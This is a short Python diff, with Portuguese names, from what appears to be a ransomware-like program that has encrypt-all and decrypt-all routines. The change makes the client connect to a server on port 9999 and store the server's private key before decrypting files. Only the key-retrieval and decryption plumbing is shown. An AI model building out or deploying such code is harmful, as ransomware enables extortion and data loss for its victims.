@@ -82,10 +82,14 @@ def listar(diretorio, tipos_arq, modo):
 
 
 def client(IP_serv):
-    s = socket.socket()
-    s.connect(("localhost",9999))
+    try:
+        s = socket.socket()
+        s.connect((IP_serv,9999))
+    except socket.error as e:
+        print('Erro de conexão: '+str(e))
+        exit()
     l = s.recv(1024)
-    f = open ("teste.txt", "wb")
+    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
     while (l):
         f.write(l)
         l = s.recv(1024)
@@ -126,6 +130,7 @@ def crypto_all():
 
 
 def decrypt_all():
+    client('localhost')
     SRSA_to_RSA()
     print('[*] chave privada do cliente descriptografada')
     RSA_to_AES()
